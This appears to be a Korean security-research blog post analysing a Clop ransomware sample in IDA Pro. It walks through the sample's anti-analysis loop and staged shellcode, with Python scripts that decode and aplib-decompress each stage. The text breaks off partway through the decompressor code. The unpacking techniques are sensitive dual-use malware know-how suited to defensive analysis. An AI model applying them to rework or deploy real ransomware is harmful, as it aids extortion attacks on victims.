<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"pwnkidhn.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="Clop &#x2F;&#x2F; Ransomware    File info   Info Value    SHA256 3d94c4a92382c5c45062d8ea0517be4011be8ba42e9c9a614a99327d0ebdf05b   File Size 183KB   File Type .exe(win32)   Function Crypto">
<meta property="og:type" content="article">
<meta property="og:title" content="Clop Ransomware">
<meta property="og:url" content="https://pwnkidhn.github.io/2021/05/24/2021-05-25-Clop/index.html">
<meta property="og:site_name" content="rvkhunLab">
<meta property="og:description" content="Clop &#x2F;&#x2F; Ransomware    File info   Info Value    SHA256 3d94c4a92382c5c45062d8ea0517be4011be8ba42e9c9a614a99327d0ebdf05b   File Size 183KB   File Type .exe(win32)   Function Crypto">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/119482051-62787800-bd8e-11eb-8c95-465fce53284a.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/119482059-64423b80-bd8e-11eb-917c-a2353c279bb4.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/119483549-0dd5fc80-bd90-11eb-83ec-e440d60596cd.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/119483553-0f072980-bd90-11eb-98fb-d364210b2444.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/119485756-68705800-bd92-11eb-8017-231cc6686fbf.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/119485758-69a18500-bd92-11eb-9a72-f491f7abf3db.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/119487256-1b8d8100-bd94-11eb-926a-0b90e4076009.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/119488156-30b6df80-bd95-11eb-9bae-185f1498de93.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/119489985-3f05fb00-bd97-11eb-9792-167a31b8725a.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/119489986-3f9e9180-bd97-11eb-89be-7d335f941ab5.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/119491533-fe0ee600-bd98-11eb-8fec-6f0deddb3060.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/119492069-9e650a80-bd99-11eb-8f75-b1a39506e900.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/119602027-4542b880-be25-11eb-8f55-fdbe8ea87f94.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/119602538-517b4580-be26-11eb-9501-16d51b87e141.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/119602903-234a3580-be27-11eb-9b70-5a859c8e043b.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/119604958-eaac5b00-be2a-11eb-9b28-20f86fc67822.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/119605228-5db5d180-be2b-11eb-838a-1f6ad410dbb8.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/119604955-e97b2e00-be2a-11eb-9daa-ee03a1ad117b.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/119605813-60fd8d00-be2c-11eb-8d12-0acaac89757a.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/119606160-01ec4800-be2d-11eb-8c41-ee6a79062579.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/119606165-0284de80-be2d-11eb-89a0-fc5b10cfe1b8.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/119606505-abcbd480-be2d-11eb-8b1d-0f1463e21523.png">
<meta property="og:image" content="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F232dfd6a-97dd-45df-b9ef-a609fb657267%2FUntitled.png?table=block&id=4d8ce2e0-0edd-4ccb-988e-4bee344d600f&spaceId=44ba02b7-7ecf-4128-9edf-5ee9c344b1ed&width=2130&userId=e7831838-17fc-4bd5-a7cd-ecea2f88bb55&cache=v2">
<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/119608828-922c8c00-be31-11eb-9473-0c60a4024516.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/119608699-585b8580-be31-11eb-8162-11e65de4f6d5.png">
<meta property="og:image" content="https://t1.daumcdn.net/cfile/tistory/99129C365FFC135619?original">
<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/119609368-6c53b700-be32-11eb-8e1b-d9f599f36a51.png">
<meta property="article:published_time" content="2021-05-24T15:00:00.000Z">
<meta property="article:modified_time" content="2021-09-25T19:06:23.237Z">
<meta property="article:author" content="rvkhun">
<meta property="article:tag" content="Malware">
<meta property="article:tag" content="Windows">
<meta property="article:tag" content="Clop">
<meta property="article:tag" content="Ransomware">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://user-images.githubusercontent.com/49066484/119482051-62787800-bd8e-11eb-8c95-465fce53284a.png">

<link rel="canonical" href="https://pwnkidhn.github.io/2021/05/24/2021-05-25-Clop/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>Clop Ransomware | rvkhunLab</title>
  <meta name="google-site-verification" content="eBj8hDfb8V5sujjVERa_zAbaTQFLbQzowFQfUz3Rhw8">
  <meta name="naver-site-verification" content="7c18a15cd138e9448d263381fe6201215fc40046">

  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/rss2.xml" title="rvkhunLab" type="application/rss+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">rvkhunLab</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Write about System Hacking</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" placeholder="Searching..." spellcheck="false" type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://pwnkidhn.github.io/2021/05/24/2021-05-25-Clop/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/raccoon1.jpg">
      <meta itemprop="name" content="rvkhun">
      <meta itemprop="description" content="Security Researcher / CTF Player">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="rvkhunLab">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Clop Ransomware
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-05-25 00:00:00" itemprop="dateCreated datePublished" datetime="2021-05-25T00:00:00+09:00">2021-05-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-09-26 04:06:23" itemprop="dateModified" datetime="2021-09-26T04:06:23+09:00">2021-09-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Research/" itemprop="url" rel="index"><span itemprop="name">Research</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <center>Clop // Ransomware</center> 


<h1 id="File-info"><a href="#File-info" class="headerlink" title="File info"></a>File info</h1><table>
<thead>
<tr>
<th align="center">Info</th>
<th align="center">Value</th>
</tr>
</thead>
<tbody><tr>
<td align="center">SHA256</td>
<td align="center">3d94c4a92382c5c45062d8ea0517be4011be8ba42e9c9a614a99327d0ebdf05b</td>
</tr>
<tr>
<td align="center">File Size</td>
<td align="center">183KB</td>
</tr>
<tr>
<td align="center">File Type</td>
<td align="center">.exe(win32)</td>
</tr>
<tr>
<td align="center">Function</td>
<td align="center">Crypto</td>
</tr>
</tbody></table>
<span id="more"></span>
<h1 id="Static-Analysis"><a href="#Static-Analysis" class="headerlink" title="Static Analysis"></a>Static Analysis</h1><h3 id="분석환경"><a href="#분석환경" class="headerlink" title="분석환경"></a>분석환경</h3><ul>
<li>OS : Windows10</li>
<li>Tools : IDA Pro, 010Editor</li>
</ul>
<h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p><img src="https://user-images.githubusercontent.com/49066484/119482051-62787800-bd8e-11eb-8c95-465fce53284a.png" alt="그림1"></p>
<p>Clop Sample을 다운 받은 후 IDA로 확인했을때의 모습이다. 바이너리가 호출하는 함수의 개수가 적은 것으로 보아 바로 악성행위를 분석할 수 있을 것 같지 않다.  <code>Line115</code>에서 for문을 500000번을 도는데 이는 단순히 동적 분석을 방해하는 fake코드 인 것 같다. 해당 루프를 탈출하면 <code>Line140</code>의 조건문으로 들어가게 된다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119482059-64423b80-bd8e-11eb-917c-a2353c279bb4.png" alt="그림2"></p>
<p>조건문안에는 쓰이지 않는 값들을 변수에 할당해주며 마지막에 <code>401000()</code>을 호출한다. </p>
<p><img src="https://user-images.githubusercontent.com/49066484/119483549-0dd5fc80-bd90-11eb-83ec-e440d60596cd.png" alt="그림3"></p>
<p><code>401000()</code>에서는 <code>VirtualAlloc</code>을 통해 메모리를 할당하게 되는데 빨간 박스 부분에서 할당한 메모리에 값을 쓰게된다. 여기서 <code>Line 176, 183, 185</code>가 연산에 쓰이는 핵심 코드이며 나머지는 쓰레기 코드이다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119483553-0f072980-bd90-11eb-98fb-d364210b2444.png" alt="그림4"></p>
<p>위 과정에서 입력한 내용을 <code>Line232</code>에서 호출하는 것으로 보아, 다음 단계로 넘어가기 위해 <code>Shellcode</code>를 쓰고 호출하는 것을 예상할 수 있다.  내용을 입력할 때 사용한 코드를 아래와 같이 python으로 똑같이 구현하여 쉘코드를 추출할 수 있었다.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROL4</span>(<span class="params">x,n</span>):</span></span><br><span class="line">    x = (x &lt;&lt; n) | (x &gt;&gt; (<span class="number">32</span>-n))</span><br><span class="line">    <span class="keyword">return</span> x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;clop&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.seek(<span class="number">0x933C</span>)</span><br><span class="line">    shellcode = f.read(<span class="number">1380</span>*<span class="number">4</span>)</span><br><span class="line">  </span><br><span class="line">decode = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1380</span>): </span><br><span class="line">    decode += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>,((<span class="number">0x4559</span> ^ ROL4(<span class="number">0x4559</span> ^ struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>,shellcode[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>])[<span class="number">0</span>],<span class="number">9</span>)) - i) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;decoded.bin&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(decode)</span><br></pre></td></tr></table></figure>



<h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p><img src="https://user-images.githubusercontent.com/49066484/119485756-68705800-bd92-11eb-8017-231cc6686fbf.png" alt="그림5"></p>
<p>Step 1에서 추출한 Shellcode를 IDA로 확인한 모습니다. TerminateThread, Virtual..와 같은 문자열이 있는걸 확인할 수 있고 이는 성공적으로 두번째 단계에 들어왔음을 의미한다. </p>
<p><img src="https://user-images.githubusercontent.com/49066484/119485758-69a18500-bd92-11eb-9a72-f491f7abf3db.png" alt="그림6"></p>
<p>Step 1에서 인자로 받아온 Kernel32와 GetProcAddress를 통해 필요한 함수 주소를 알아온다. 성공적으로 모든 함수의 주소를 알아 왔다면 VirtualQuery 함수를 호출한다. </p>
<p><img src="https://user-images.githubusercontent.com/49066484/119487256-1b8d8100-bd94-11eb-926a-0b90e4076009.png" alt="그림7"></p>
<p>VirtualQuery함수는 프로세스의 특정 메모리의 정보, 권한을 얻어온다. 여기서 <code>lpAddress</code>의 인자 값으로 <code>retaddr</code>이 들어갔는데 이 주소는 Step 1에서 Shellcode 호출 후 다음으로 실행될 주소이다. 이는 이전 Step 의 바이너리의 ImageBase주소의 정보를 얻기 위함으로 예상된다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119488156-30b6df80-bd95-11eb-9bae-185f1498de93.png" alt="그림8"></p>
<p><code>Line265 269</code>에서 args[2],args[4]만큼의 크기를 VirtualAlloc한다. 여기서 args는 Step 1에서 Shellcode를 호출 할 때의 인자값들로 아래 그림을 참고하면 args[2]는 3번째 인자인 <code>0x19d48</code> args[4]는 5번째 인자인 <code>0x20200</code>임을 알 수 있다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119489985-3f05fb00-bd97-11eb-9792-167a31b8725a.png" alt="그림9"></p>
<p><img src="https://user-images.githubusercontent.com/49066484/119489986-3f9e9180-bd97-11eb-89be-7d335f941ab5.png" alt="그림10"></p>
<p>각각 크기로 VirtualAlloc을 한 후, 반복문을 통해 <code>0x19d48</code>만큼 할당한 메모리에 값을 쓴다. 이 과정에서는 Step 1에서 Shellcode를 추출할 때 보였던 코드가 있으며, 이는 다음 단계로 넘어가는 Shellcode를 추출하는 것임을 다시 한 번 예상할 수 있다. Shellcode를 추출 한 후   <code>aplib_decompress</code>을 호출한다. 이때 인자는 <code>0x19d48</code>만큼 할당한 메모리와 <code>0x20200</code>만큼 할당한 메모리가 되는데 추출 한 Shellcode를 decompress하여 해당 내용을 더 큰 메모리에 쓰는 역할을 한다. </p>
<p>다음 단계로 넘어가기 위해 Step 1과 동일하게 해당 코드를 python으로 구현하였고, 이 때 decompress하는 과정은 아래 모듈을 사용했다.</p>
<ul>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/snemes/aplib/blob/master/aplib.py">https://github.com/snemes/aplib/blob/master/aplib.py</a></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> crc32</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">__all__ = [<span class="string">&#x27;APLib&#x27;</span>, <span class="string">&#x27;decompress&#x27;</span>]</span><br><span class="line">__version__ = <span class="string">&#x27;0.6&#x27;</span></span><br><span class="line">__author__ = <span class="string">&#x27;Sandor Nemes&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">APLib</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    __slots__ = <span class="string">&#x27;source&#x27;</span>, <span class="string">&#x27;destination&#x27;</span>, <span class="string">&#x27;tag&#x27;</span>, <span class="string">&#x27;bitcount&#x27;</span>, <span class="string">&#x27;strict&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, source, strict=<span class="literal">True</span></span>):</span></span><br><span class="line">        self.source = BytesIO(source)</span><br><span class="line">        self.destination = <span class="built_in">bytearray</span>()</span><br><span class="line">        self.tag = <span class="number">0</span></span><br><span class="line">        self.bitcount = <span class="number">0</span></span><br><span class="line">        self.strict = <span class="built_in">bool</span>(strict)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getbit</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># check if tag is empty</span></span><br><span class="line">        self.bitcount -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> self.bitcount &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># load next tag</span></span><br><span class="line">            self.tag = <span class="built_in">ord</span>(self.source.read(<span class="number">1</span>))</span><br><span class="line">            self.bitcount = <span class="number">7</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># shift bit out of tag</span></span><br><span class="line">        bit = self.tag &gt;&gt; <span class="number">7</span> &amp; <span class="number">1</span></span><br><span class="line">        self.tag &lt;&lt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> bit</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getgamma</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># input gamma2-encoded bits</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            result = (result &lt;&lt; <span class="number">1</span>) + self.getbit()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.getbit():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">depack</span>(<span class="params">self</span>):</span></span><br><span class="line">        r0 = -<span class="number">1</span></span><br><span class="line">        lwm = <span class="number">0</span></span><br><span class="line">        done = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment"># first byte verbatim</span></span><br><span class="line">            self.destination += self.source.read(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># main decompression loop</span></span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> done:</span><br><span class="line">                <span class="keyword">if</span> self.getbit():</span><br><span class="line">                    <span class="keyword">if</span> self.getbit():</span><br><span class="line">                        <span class="keyword">if</span> self.getbit():</span><br><span class="line">                            offs = <span class="number">0</span></span><br><span class="line">                            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                                offs = (offs &lt;&lt; <span class="number">1</span>) + self.getbit()</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> offs:</span><br><span class="line">                                self.destination.append(self.destination[-offs])</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                self.destination.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">                            lwm = <span class="number">0</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            offs = <span class="built_in">ord</span>(self.source.read(<span class="number">1</span>))</span><br><span class="line">                            length = <span class="number">2</span> + (offs &amp; <span class="number">1</span>)</span><br><span class="line">                            offs &gt;&gt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> offs:</span><br><span class="line">                                <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">                                    self.destination.append(self.destination[-offs])</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                done = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">                            r0 = offs</span><br><span class="line">                            lwm = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        offs = self.getgamma()</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> lwm == <span class="number">0</span> <span class="keyword">and</span> offs == <span class="number">2</span>:</span><br><span class="line">                            offs = r0</span><br><span class="line">                            length = self.getgamma()</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">                                self.destination.append(self.destination[-offs])</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">if</span> lwm == <span class="number">0</span>:</span><br><span class="line">                                offs -= <span class="number">3</span></span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                offs -= <span class="number">2</span></span><br><span class="line"></span><br><span class="line">                            offs &lt;&lt;= <span class="number">8</span></span><br><span class="line">                            offs += <span class="built_in">ord</span>(self.source.read(<span class="number">1</span>))</span><br><span class="line">                            length = self.getgamma()</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> offs &gt;= <span class="number">32000</span>:</span><br><span class="line">                                length += <span class="number">1</span></span><br><span class="line">                            <span class="keyword">if</span> offs &gt;= <span class="number">1280</span>:</span><br><span class="line">                                length += <span class="number">1</span></span><br><span class="line">                            <span class="keyword">if</span> offs 